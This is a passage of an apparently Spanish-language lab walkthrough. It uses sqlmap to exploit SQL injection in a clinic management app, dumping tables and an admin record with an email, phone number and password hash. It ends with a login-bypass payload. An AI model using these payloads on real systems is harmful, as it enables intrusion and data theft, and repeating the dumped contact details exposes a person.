[06:49:20] [INFO] retrieved: 'medicine_name'
[06:49:21] [INFO] retrieved: 'varchar(25)'
[06:49:21] [INFO] retrieved: 'cost'
[06:49:21] [INFO] retrieved: 'float(10,2)'
[06:49:21] [INFO] retrieved: 'unit'
[06:49:21] [INFO] retrieved: 'int(10)'
[06:49:21] [INFO] retrieved: 'dosage'
[06:49:21] [INFO] retrieved: 'varchar(25)'
[06:49:21] [INFO] retrieved: 'status'
[06:49:21] [INFO] retrieved: 'varchar(10)'
[06:49:21] [INFO] fetching entries for table 'prescription_records' in database 'clinic_db'
[06:49:21] [INFO] fetching number of entries for table 'prescription_records' in database 'clinic_db'
[06:49:21] [INFO] resumed: 0
[06:49:21] [WARNING] table 'prescription_records' in database 'clinic_db' appears to be empty
Database: clinic_db
Table: prescription_records
[0 entries]
+-----------------+------------------------+------+------+--------+----------+---------------+
| prescription_id | prescription_record_id | cost | unit | dosage | status   | medicine_name |
+-----------------+------------------------+------+------+--------+----------+---------------+
+-----------------+------------------------+------+------+--------+----------+---------------+

[06:49:21] [INFO] table 'clinic_db.prescription_records' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/prescription_records.csv'                                                                                                                                  
[06:49:21] [INFO] fetching columns for table 'tbl_permission_role' in database 'clinic_db'
[06:49:21] [INFO] retrieved: 'id'
[06:49:21] [INFO] retrieved: 'int(30)'
[06:49:21] [INFO] retrieved: 'permission_id'
[06:49:21] [INFO] retrieved: 'int(30)'
[06:49:21] [INFO] retrieved: 'role_id'
[06:49:21] [INFO] retrieved: 'int(30)'
[06:49:21] [INFO] fetching entries for table 'tbl_permission_role' in database 'clinic_db'
[06:49:21] [INFO] retrieved: '1'
[06:49:21] [INFO] retrieved: '1'
[06:49:21] [INFO] retrieved: '1'
[06:49:21] [INFO] retrieved: '2'
[06:49:21] [INFO] retrieved: '2'
[06:49:21] [INFO] retrieved: '1'
[06:49:21] [INFO] retrieved: '3'
[06:49:21] [INFO] retrieved: '3'
[06:49:21] [INFO] retrieved: '1'
[06:49:21] [INFO] retrieved: '4'
[06:49:21] [INFO] retrieved: '4'
[06:49:21] [INFO] retrieved: '1'
[06:49:21] [INFO] retrieved: '5'
[06:49:21] [INFO] retrieved: '5'
[06:49:21] [INFO] retrieved: '1'
[06:49:21] [INFO] retrieved: '6'
[06:49:21] [INFO] retrieved: '6'
[06:49:21] [INFO] retrieved: '1'
[06:49:21] [INFO] retrieved: '7'
[06:49:21] [INFO] retrieved: '7'
[06:49:21] [INFO] retrieved: '1'
[06:49:21] [INFO] retrieved: '8'
[06:49:21] [INFO] retrieved: '8'
[06:49:21] [INFO] retrieved: '1'
[06:49:21] [INFO] retrieved: '9'
[06:49:22] [INFO] retrieved: '9'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '10'
[06:49:22] [INFO] retrieved: '10'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '11'
[06:49:22] [INFO] retrieved: '11'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '12'
[06:49:22] [INFO] retrieved: '12'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '13'
[06:49:22] [INFO] retrieved: '13'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '14'
[06:49:22] [INFO] retrieved: '14'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '15'
[06:49:22] [INFO] retrieved: '15'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '16'
[06:49:22] [INFO] retrieved: '16'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '17'
[06:49:22] [INFO] retrieved: '17'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '18'
[06:49:22] [INFO] retrieved: '18'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '19'
[06:49:22] [INFO] retrieved: '19'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '20'
[06:49:22] [INFO] retrieved: '20'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '21'
[06:49:22] [INFO] retrieved: '21'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '22'
[06:49:22] [INFO] retrieved: '22'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '23'
[06:49:22] [INFO] retrieved: '23'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '24'
[06:49:22] [INFO] retrieved: '24'
[06:49:22] [INFO] retrieved: '1'
[06:49:22] [INFO] retrieved: '25'
[06:49:22] [INFO] retrieved: '25'
[06:49:22] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '26'
[06:49:23] [INFO] retrieved: '26'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '27'
[06:49:23] [INFO] retrieved: '27'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '28'
[06:49:23] [INFO] retrieved: '28'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '29'
[06:49:23] [INFO] retrieved: '29'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '30'
[06:49:23] [INFO] retrieved: '30'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '31'
[06:49:23] [INFO] retrieved: '31'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '32'
[06:49:23] [INFO] retrieved: '32'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '33'
[06:49:23] [INFO] retrieved: '33'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '34'
[06:49:23] [INFO] retrieved: '34'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '35'
[06:49:23] [INFO] retrieved: '35'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '36'
[06:49:23] [INFO] retrieved: '36'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '37'
[06:49:23] [INFO] retrieved: '37'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '38'
[06:49:23] [INFO] retrieved: '38'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '39'
[06:49:23] [INFO] retrieved: '39'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '40'
[06:49:23] [INFO] retrieved: '40'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '41'
[06:49:23] [INFO] retrieved: '41'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '42'
[06:49:23] [INFO] retrieved: '42'
[06:49:23] [INFO] retrieved: '1'
[06:49:23] [INFO] retrieved: '43'
[06:49:23] [INFO] retrieved: '43'
[06:49:23] [INFO] retrieved: '1'
[06:49:24] [INFO] retrieved: '44'
[06:49:24] [INFO] retrieved: '44'
[06:49:24] [INFO] retrieved: '1'
[06:49:24] [INFO] retrieved: '45'
[06:49:24] [INFO] retrieved: '1'
[06:49:24] [INFO] retrieved: '2'
[06:49:24] [INFO] retrieved: '46'
[06:49:24] [INFO] retrieved: '2'
[06:49:24] [INFO] retrieved: '2'
[06:49:24] [INFO] retrieved: '47'
[06:49:24] [INFO] retrieved: '6'
[06:49:24] [INFO] retrieved: '2'
[06:49:24] [INFO] retrieved: '48'
[06:49:24] [INFO] retrieved: '9'
[06:49:24] [INFO] retrieved: '2'
[06:49:24] [INFO] retrieved: '49'
[06:49:24] [INFO] retrieved: '12'
[06:49:24] [INFO] retrieved: '2'
[06:49:24] [INFO] retrieved: '50'
[06:49:24] [INFO] retrieved: '17'
[06:49:24] [INFO] retrieved: '2'
[06:49:24] [INFO] retrieved: '51'
[06:49:24] [INFO] retrieved: '35'
[06:49:24] [INFO] retrieved: '2'
[06:49:24] [INFO] retrieved: '52'
[06:49:24] [INFO] retrieved: '39'
[06:49:24] [INFO] retrieved: '2'
[06:49:24] [INFO] retrieved: '53'
[06:49:24] [INFO] retrieved: '40'
[06:49:24] [INFO] retrieved: '2'
[06:49:24] [INFO] retrieved: '54'
[06:49:24] [INFO] retrieved: '41'
[06:49:24] [INFO] retrieved: '2'
[06:49:24] [INFO] retrieved: '55'
[06:49:24] [INFO] retrieved: '42'
[06:49:24] [INFO] retrieved: '2'
[06:49:24] [INFO] retrieved: '56'
[06:49:24] [INFO] retrieved: '43'
[06:49:24] [INFO] retrieved: '2'
[06:49:24] [INFO] retrieved: '57'
[06:49:24] [INFO] retrieved: '44'
[06:49:24] [INFO] retrieved: '2'
[06:49:24] [INFO] retrieved: '236'
[06:49:24] [INFO] retrieved: '34'
[06:49:24] [INFO] retrieved: '4'
[06:49:24] [INFO] retrieved: '237'
[06:49:24] [INFO] retrieved: '1'
[06:49:24] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '238'
[06:49:25] [INFO] retrieved: '2'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '239'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '240'
[06:49:25] [INFO] retrieved: '4'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '241'
[06:49:25] [INFO] retrieved: '5'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '242'
[06:49:25] [INFO] retrieved: '6'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '243'
[06:49:25] [INFO] retrieved: '7'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '244'
[06:49:25] [INFO] retrieved: '8'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '245'
[06:49:25] [INFO] retrieved: '9'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '246'
[06:49:25] [INFO] retrieved: '10'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '247'
[06:49:25] [INFO] retrieved: '13'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '248'
[06:49:25] [INFO] retrieved: '14'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '249'
[06:49:25] [INFO] retrieved: '17'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '250'
[06:49:25] [INFO] retrieved: '18'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '251'
[06:49:25] [INFO] retrieved: '26'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '252'
[06:49:25] [INFO] retrieved: '27'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '253'
[06:49:25] [INFO] retrieved: '28'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '254'
[06:49:25] [INFO] retrieved: '29'
[06:49:25] [INFO] retrieved: '3'
[06:49:25] [INFO] retrieved: '255'
[06:49:26] [INFO] retrieved: '34'
[06:49:26] [INFO] retrieved: '3'
[06:49:26] [INFO] retrieved: '256'
[06:49:26] [INFO] retrieved: '35'
[06:49:26] [INFO] retrieved: '3'
[06:49:26] [INFO] retrieved: '257'
[06:49:26] [INFO] retrieved: '36'
[06:49:26] [INFO] retrieved: '3'
[06:49:26] [INFO] retrieved: '258'
[06:49:26] [INFO] retrieved: '37'
[06:49:26] [INFO] retrieved: '3'
[06:49:26] [INFO] retrieved: '259'
[06:49:26] [INFO] retrieved: '38'
[06:49:26] [INFO] retrieved: '3'
[06:49:26] [INFO] retrieved: '260'
[06:49:26] [INFO] retrieved: '39'
[06:49:26] [INFO] retrieved: '3'
[06:49:26] [INFO] retrieved: '261'
[06:49:26] [INFO] retrieved: '40'
[06:49:26] [INFO] retrieved: '3'
[06:49:26] [INFO] retrieved: '262'
[06:49:26] [INFO] retrieved: '41'
[06:49:26] [INFO] retrieved: '3'
[06:49:26] [INFO] retrieved: '263'
[06:49:26] [INFO] retrieved: '42'
[06:49:26] [INFO] retrieved: '3'
[06:49:26] [INFO] retrieved: '264'
[06:49:26] [INFO] retrieved: '43'
[06:49:26] [INFO] retrieved: '3'
[06:49:26] [INFO] retrieved: '265'
[06:49:26] [INFO] retrieved: '44'
[06:49:26] [INFO] retrieved: '3'
Database: clinic_db
Table: tbl_permission_role
[87 entries]
+-----+---------+---------------+
| id  | role_id | permission_id |
+-----+---------+---------------+
| 1   | 1       | 1             |
| 2   | 1       | 2             |
| 3   | 1       | 3             |
| 4   | 1       | 4             |
| 5   | 1       | 5             |
| 6   | 1       | 6             |
| 7   | 1       | 7             |
| 8   | 1       | 8             |
| 9   | 1       | 9             |
| 10  | 1       | 10            |
| 11  | 1       | 11            |
| 12  | 1       | 12            |
| 13  | 1       | 13            |
| 14  | 1       | 14            |
| 15  | 1       | 15            |
| 16  | 1       | 16            |
| 17  | 1       | 17            |
| 18  | 1       | 18            |
| 19  | 1       | 19            |
| 20  | 1       | 20            |
| 21  | 1       | 21            |
| 22  | 1       | 22            |
| 23  | 1       | 23            |
| 24  | 1       | 24            |
| 25  | 1       | 25            |
| 26  | 1       | 26            |
| 27  | 1       | 27            |
| 28  | 1       | 28            |
| 29  | 1       | 29            |
| 30  | 1       | 30            |
| 31  | 1       | 31            |
| 32  | 1       | 32            |
| 33  | 1       | 33            |
| 34  | 1       | 34            |
| 35  | 1       | 35            |
| 36  | 1       | 36            |
| 37  | 1       | 37            |
| 38  | 1       | 38            |
| 39  | 1       | 39            |
| 40  | 1       | 40            |
| 41  | 1       | 41            |
| 42  | 1       | 42            |
| 43  | 1       | 43            |
| 44  | 1       | 44            |
| 45  | 2       | 1             |
| 46  | 2       | 2             |
| 47  | 2       | 6             |
| 48  | 2       | 9             |
| 49  | 2       | 12            |
| 50  | 2       | 17            |
| 51  | 2       | 35            |
| 52  | 2       | 39            |
| 53  | 2       | 40            |
| 54  | 2       | 41            |
| 55  | 2       | 42            |
| 56  | 2       | 43            |
| 57  | 2       | 44            |
| 236 | 4       | 34            |
| 237 | 3       | 1             |
| 238 | 3       | 2             |
| 239 | 3       | 3             |
| 240 | 3       | 4             |
| 241 | 3       | 5             |
| 242 | 3       | 6             |
| 243 | 3       | 7             |
| 244 | 3       | 8             |
| 245 | 3       | 9             |
| 246 | 3       | 10            |
| 247 | 3       | 13            |
| 248 | 3       | 14            |
| 249 | 3       | 17            |
| 250 | 3       | 18            |
| 251 | 3       | 26            |
| 252 | 3       | 27            |
| 253 | 3       | 28            |
| 254 | 3       | 29            |
| 255 | 3       | 34            |
| 256 | 3       | 35            |
| 257 | 3       | 36            |
| 258 | 3       | 37            |
| 259 | 3       | 38            |
| 260 | 3       | 39            |
| 261 | 3       | 40            |
| 262 | 3       | 41            |
| 263 | 3       | 42            |
| 264 | 3       | 43            |
| 265 | 3       | 44            |
+-----+---------+---------------+

[06:49:26] [INFO] table 'clinic_db.tbl_permission_role' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/tbl_permission_role.csv'                                                                                                                                    
[06:49:26] [INFO] fetching columns for table 'department' in database 'clinic_db'
[06:49:26] [INFO] retrieved: 'departmentid'
[06:49:26] [INFO] retrieved: 'int(10)'
[06:49:26] [INFO] retrieved: 'departmentname'
[06:49:26] [INFO] retrieved: 'varchar(100)'
[06:49:26] [INFO] retrieved: 'description'
[06:49:26] [INFO] retrieved: 'text'
[06:49:26] [INFO] retrieved: 'status'
[06:49:26] [INFO] retrieved: 'varchar(10)'
[06:49:26] [INFO] retrieved: 'delete_status'
[06:49:27] [INFO] retrieved: 'int(11)'
[06:49:27] [INFO] fetching entries for table 'department' in database 'clinic_db'
[06:49:27] [INFO] retrieved: 'ICU department for people with serious illness'
[06:49:27] [INFO] retrieved: 'Active'
[06:49:27] [INFO] retrieved: '0'
[06:49:27] [INFO] retrieved: '1'
[06:49:27] [INFO] retrieved: 'ICU department'
[06:49:27] [INFO] retrieved: 'neurology department for treating diseases of nervous system'
[06:49:27] [INFO] retrieved: 'Active'
[06:49:27] [INFO] retrieved: '0'
[06:49:27] [INFO] retrieved: '2'
[06:49:27] [INFO] retrieved: 'Neurology department'
Database: clinic_db
Table: department
[2 entries]
+--------------+----------+--------------------------------------------------------------+---------------+----------------------+
| departmentid | status   | description                                                  | delete_status | departmentname       |
+--------------+----------+--------------------------------------------------------------+---------------+----------------------+
| 1            | Active   | ICU department for people with serious illness               | 0             | ICU department       |
| 2            | Active   | neurology department for treating diseases of nervous system | 0             | Neurology department |
+--------------+----------+--------------------------------------------------------------+---------------+----------------------+

[06:49:27] [INFO] table 'clinic_db.department' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/department.csv'
[06:49:27] [INFO] fetching columns for table 'admin' in database 'clinic_db'
[06:49:27] [INFO] retrieved: 'id'
[06:49:27] [INFO] retrieved: 'int(11)'
[06:49:27] [INFO] retrieved: 'username'
[06:49:27] [INFO] retrieved: 'varchar(500)'
[06:49:27] [INFO] retrieved: 'loginid'
[06:49:27] [INFO] retrieved: 'varchar(30)'
[06:49:27] [INFO] retrieved: 'password'
[06:49:27] [INFO] retrieved: 'varchar(100)'
[06:49:27] [INFO] retrieved: 'fname'
[06:49:27] [INFO] retrieved: 'varchar(50)'
[06:49:27] [INFO] retrieved: 'lname'
[06:49:27] [INFO] retrieved: 'varchar(500)'
[06:49:27] [INFO] retrieved: 'gender'
[06:49:27] [INFO] retrieved: 'varchar(500)'
[06:49:27] [INFO] retrieved: 'dob'
[06:49:27] [INFO] retrieved: 'text'
[06:49:27] [INFO] retrieved: 'mobileno'
[06:49:27] [INFO] retrieved: 'text'
[06:49:27] [INFO] retrieved: 'addr'
[06:49:27] [INFO] retrieved: 'varchar(500)'
[06:49:27] [INFO] retrieved: 'notes'
[06:49:27] [INFO] retrieved: 'varchar(200)'
[06:49:27] [INFO] retrieved: 'image'
[06:49:27] [INFO] retrieved: 'varchar(2000)'
[06:49:27] [INFO] retrieved: 'created_on'
[06:49:27] [INFO] retrieved: 'date'
[06:49:27] [INFO] retrieved: 'updated_on'
[06:49:27] [INFO] retrieved: 'date'
[06:49:27] [INFO] retrieved: 'role_id'
[06:49:27] [INFO] retrieved: 'int(11)'
[06:49:27] [INFO] retrieved: 'last_login'
[06:49:27] [INFO] retrieved: 'date'
[06:49:27] [INFO] retrieved: 'delete_status'
[06:49:27] [INFO] retrieved: 'int(11)'
[06:49:27] [INFO] fetching entries for table 'admin' in database 'clinic_db'
[06:49:28] [INFO] retrieved: '<p>Maharashtra, India</p>\r\n'
[06:49:28] [INFO] retrieved: '2018-04-30'
[06:49:28] [INFO] retrieved: '0'
[06:49:28] [INFO] retrieved: '2018-11-26'
[06:49:28] [INFO] retrieved: 'Nikhil Bhalerao'
[06:49:28] [INFO] retrieved: 'Male'
[06:49:28] [INFO] retrieved: '1'
[06:49:28] [INFO] retrieved: 'profile.jpg'
[06:49:28] [INFO] retrieved: '0000-00-00'
[06:49:28] [INFO] retrieved: 'admin'
[06:49:28] [INFO] retrieved: 'ndbhalerao91@gmail.com'
[06:49:28] [INFO] retrieved: '9423979339'
[06:49:28] [INFO] retrieved: '<p>admin panel</p>\r\n'
[06:49:28] [INFO] retrieved: 'aa7f019c326413d5b8bcad4314228bcd33ef557f5d81c7cc977f7728156f4357'
[06:49:28] [INFO] retrieved: '1'
[06:49:28] [INFO] retrieved: '2019-10-15'
[06:49:28] [INFO] retrieved: 'admin'
[06:49:28] [INFO] recognized possible password hashes in column 'password'
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[06:50:07] [INFO] using hash method 'sha256_generic_passwd'
[06:50:07] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[06:50:54] [WARNING] no clear password(s) found                                                                                                    
Database: clinic_db
Table: admin
[1 entry]
+----+------------------------+---------+------------+-------------------------------+-----------------+-------------+-------+------------------------+--------+------------+------------------------------------------------------------------+----------+------------+------------+------------+---------------+
| id | loginid                | role_id | dob        | addr                          | fname           | image       | lname | notes                  | gender | mobileno   | password                                                         | username | created_on | last_login | updated_on | delete_status |
+----+------------------------+---------+------------+-------------------------------+-----------------+-------------+-------+------------------------+--------+------------+------------------------------------------------------------------+----------+------------+------------+------------+---------------+
| 1  | ndbhalerao91@gmail.com | 1       | 2018-11-26 | <p>Maharashtra, India</p>\r\n | Nikhil Bhalerao | profile.jpg | admin | <p>admin panel</p>\r\n | Male   | 9423979339 | aa7f019c326413d5b8bcad4314228bcd33ef557f5d81c7cc977f7728156f4357 | admin    | 2018-04-30 | 0000-00-00 | 2019-10-15 | 0             |
+----+------------------------+---------+------------+-------------------------------+-----------------+-------------+-------+------------------------+--------+------------+------------------------------------------------------------------+----------+------------+------------+------------+---------------+

[06:50:54] [INFO] table 'clinic_db.`admin`' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/admin.csv'
[06:50:54] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.195.143'
[06:50:54] [WARNING] your sqlmap version is outdated

[*] ending @ 06:50:54 /2024-05-24/
```

Tambien podeis hacerlo de otra forma para ir solo a la tabla `admin`...

```shell
sqlmap -r request.txt --dbms=mysql --dbs --users --risk=3 --level=5 -D clinic_db -T admin --dump
```

Info:

```
       ___
       __H__                                                                                                                                        
 ___ ___[(]_____ ___ ___  {1.7.11#stable}                                                                                                           
|_ -| . [,]     | .'| . |                                                                                                                           
|___|_  [']_|_|_|__,|  _|                                                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:04:16 /2024-05-24/

[07:04:16] [INFO] parsing HTTP request from 'hms.sql'
[07:04:16] [WARNING] provided value for parameter 'btn_login' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[07:04:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: user=admin&email=test@gmail.com' OR NOT 8870=8870-- NmEY&password=aa&btn_login=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: user=admin&email=test@gmail.com' OR (SELECT 7125 FROM(SELECT COUNT(*),CONCAT(0x7162717671,(SELECT (ELT(7125=7125,1))),0x71786b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- idzu&password=aa&btn_login=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin&email=test@gmail.com' AND (SELECT 5999 FROM (SELECT(SLEEP(5)))dtkH)-- MpGo&password=aa&btn_login=
---
[07:04:16] [INFO] testing MySQL
[07:04:16] [INFO] confirming MySQL
[07:04:17] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.48, PHP 7.3.29
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[07:04:17] [INFO] fetching database users
database management system users [5]:
[*] ''@'localhost'
[*] 'pma'@'localhost'
[*] 'root'@'127.0.0.1'
[*] 'root'@'::1'
[*] 'root'@'localhost'

[07:04:17] [INFO] fetching database names
[07:04:17] [INFO] resumed: 'information_schema'
[07:04:17] [INFO] resumed: 'phpmyadmin'
[07:04:17] [INFO] resumed: 'clinic_db'
[07:04:17] [INFO] resumed: 'test'
[07:04:17] [INFO] resumed: 'performance_schema'
[07:04:17] [INFO] resumed: 'mysql'
available databases [6]:
[*] clinic_db
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

[07:04:17] [INFO] fetching columns for table 'admin' in database 'clinic_db'
[07:04:17] [INFO] resumed: 'id'
[07:04:17] [INFO] resumed: 'int(11)'
[07:04:17] [INFO] resumed: 'username'
[07:04:17] [INFO] resumed: 'varchar(500)'
[07:04:17] [INFO] resumed: 'loginid'
[07:04:17] [INFO] resumed: 'varchar(30)'
[07:04:17] [INFO] resumed: 'password'
[07:04:17] [INFO] resumed: 'varchar(100)'
[07:04:17] [INFO] resumed: 'fname'
[07:04:17] [INFO] resumed: 'varchar(50)'
[07:04:17] [INFO] resumed: 'lname'
[07:04:17] [INFO] resumed: 'varchar(500)'
[07:04:17] [INFO] resumed: 'gender'
[07:04:17] [INFO] resumed: 'varchar(500)'
[07:04:17] [INFO] resumed: 'dob'
[07:04:17] [INFO] resumed: 'text'
[07:04:17] [INFO] resumed: 'mobileno'
[07:04:17] [INFO] resumed: 'text'
[07:04:17] [INFO] resumed: 'addr'
[07:04:17] [INFO] resumed: 'varchar(500)'
[07:04:17] [INFO] resumed: 'notes'
[07:04:17] [INFO] resumed: 'varchar(200)'
[07:04:17] [INFO] resumed: 'image'
[07:04:17] [INFO] resumed: 'varchar(2000)'
[07:04:17] [INFO] resumed: 'created_on'
[07:04:17] [INFO] resumed: 'date'
[07:04:17] [INFO] resumed: 'updated_on'
[07:04:17] [INFO] resumed: 'date'
[07:04:17] [INFO] resumed: 'role_id'
[07:04:17] [INFO] resumed: 'int(11)'
[07:04:17] [INFO] resumed: 'last_login'
[07:04:17] [INFO] resumed: 'date'
[07:04:17] [INFO] resumed: 'delete_status'
[07:04:17] [INFO] resumed: 'int(11)'
[07:04:17] [INFO] fetching entries for table 'admin' in database 'clinic_db'
[07:04:17] [INFO] resumed: '<p>Maharashtra, India</p>\r\n'
[07:04:17] [INFO] resumed: '2018-04-30'
[07:04:17] [INFO] resumed: '0'
[07:04:17] [INFO] resumed: '2018-11-26'
[07:04:17] [INFO] resumed: 'Nikhil Bhalerao'
[07:04:17] [INFO] resumed: 'Male'
[07:04:17] [INFO] resumed: '1'
[07:04:17] [INFO] resumed: 'profile.jpg'
[07:04:17] [INFO] resumed: '0000-00-00'
[07:04:17] [INFO] resumed: 'admin'
[07:04:17] [INFO] resumed: 'ndbhalerao91@gmail.com'
[07:04:17] [INFO] resumed: '9423979339'
[07:04:17] [INFO] resumed: '<p>admin panel</p>\r\n'
[07:04:17] [INFO] resumed: 'aa7f019c326413d5b8bcad4314228bcd33ef557f5d81c7cc977f7728156f4357'
[07:04:17] [INFO] resumed: '1'
[07:04:17] [INFO] resumed: '2019-10-15'
[07:04:17] [INFO] resumed: 'admin'
[07:04:17] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[07:04:25] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 2
what's the custom dictionary's location?
> /usr/share/wordlists/rockyou.txt
[07:05:03] [INFO] using custom dictionary
[07:05:03] [CRITICAL] there was a problem while loading dictionaries ('unable to read file '/u/usr/share/wordlists/rockyou.txt'')
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> /usr/share/wordlists/rockyou.txt
[07:05:09] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[07:05:12] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[07:05:12] [INFO] starting 2 processes 
[07:06:02] [WARNING] no clear password(s) found                                                                                                    
Database: clinic_db
Table: admin
[1 entry]
+----+------------------------+---------+------------+-------------------------------+-----------------+-------------+-------+------------------------+--------+------------+------------------------------------------------------------------+----------+------------+------------+------------+---------------+
| id | loginid                | role_id | dob        | addr                          | fname           | image       | lname | notes                  | gender | mobileno   | password                                                         | username | created_on | last_login | updated_on | delete_status |
+----+------------------------+---------+------------+-------------------------------+-----------------+-------------+-------+------------------------+--------+------------+------------------------------------------------------------------+----------+------------+------------+------------+---------------+
| 1  | ndbhalerao91@gmail.com | 1       | 2018-11-26 | <p>Maharashtra, India</p>\r\n | Nikhil Bhalerao | profile.jpg | admin | <p>admin panel</p>\r\n | Male   | 9423979339 | aa7f019c326413d5b8bcad4314228bcd33ef557f5d81c7cc977f7728156f4357 | admin    | 2018-04-30 | 0000-00-00 | 2019-10-15 | 0             |
+----+------------------------+---------+------------+-------------------------------+-----------------+-------------+-------+------------------------+--------+------------+------------------------------------------------------------------+----------+------------+------------+------------+---------------+

[07:06:02] [INFO] table 'clinic_db.`admin`' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/admin.csv'
[07:06:02] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.195.143'
[07:06:02] [WARNING] your sqlmap version is outdated

[*] ending @ 07:06:02 /2024-05-24/
```

Credentials:

```
User = ndbhalerao91@gmail.com
Password = aa7f019c326413d5b8bcad4314228bcd33ef557f5d81c7cc977f7728156f4357
```

En principio deberiamos de crckear la contraseña, pero no lo consegui, por lo que intente quitar la verificacion de que se tenga que añadir un `email`, tendremos que inspeccionar el codigo y eliminar lo siguiente...

Codigo sin tocar...

```html
<input type="email" name="email" class="form-control" required="" placeholder="Email">
```

Codigo modificado...

```html
<input name="email" class="form-control" required="" placeholder="Email">
```

Una vez hecho estos cambios meteremos en el `password` lo que queramos y en el campo del `email` ya que hemos quitado la verificacion le meteremos codigo de SQL Injection `' OR 1=1-- -` para poder logearnos como si fueramos `admin` y saltarnos la verificacion...

